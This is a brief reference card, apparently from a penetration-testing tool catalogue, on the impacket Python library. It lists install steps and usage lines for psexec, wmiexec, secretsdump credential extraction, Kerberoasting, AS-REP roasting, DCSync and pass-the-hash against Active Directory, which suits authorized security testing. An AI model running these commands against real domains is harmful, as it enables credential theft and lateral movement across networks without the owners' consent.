# impacket

**Type:** Python Library and Tools
**Purpose:** Network protocol manipulation and exploitation
**Platform:** Windows, Linux, macOS
**Tags:** #python #smb #kerberos #ntlm #active-directory #lateral-movement

---

## Installation

```bash
pip3 install impacket

# Or from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

---

## Common Tools

```bash
# PSExec-like functionality
psexec.py domain/user:password@target

# SMB enumeration
smbclient.py domain/user:password@target

# Secretsdump (cred extraction)
secretsdump.py domain/user:password@dc-ip

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip dc-ip -request

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -dc-ip dc-ip

# DCSync
secretsdump.py domain/user:password@dc-ip -just-dc

# WMI exec
wmiexec.py domain/user:password@target
```

---

## Pro Tips

💡 **Network Protocols**: Low-level protocol implementations
💡 **Pass-the-Hash**: Many tools support PTH attacks
💡 **No Agent**: Pure network-based, no agent needed
💡 **Cross-Platform**: Works on Linux/macOS for Windows targeting
💡 **Active Directory**: Essential toolkit for AD pentesting

---

## Note

Windows AD toolkit, included for comprehensive coverage.

---

## Resources

- GitHub: https://github.com/fortra/impacket
- Company: Fortra (SecureAuth)
